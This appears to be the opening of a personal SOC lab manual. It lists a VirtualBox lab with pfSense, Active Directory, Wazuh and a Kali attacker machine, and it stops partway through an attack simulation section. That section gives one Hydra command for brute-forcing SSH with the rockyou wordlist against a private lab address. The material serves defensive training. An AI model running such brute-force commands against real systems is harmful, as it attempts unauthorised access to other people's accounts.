# SOC Lab Manual

This lab manual documents the step-by-step setup, attack simulations, and detections from my SOC project.

---

## 1. Lab Environment Setup
- VirtualBox setup
- pfSense firewall configuration
- LAN segmentation (IT, HR, Marketing, DMZ)
- Windows Server 2022 (AD + DNS + DHCP)
- Ubuntu server (Wazuh agent installed)
- Kali Linux (attacker machine)
- Windows 10/11 endpoints

---

## 2. Attack Simulation Example
### SSH Brute Force (Hydra)
```bash
hydra -l user -P rockyou.txt ssh://192.168.56.101
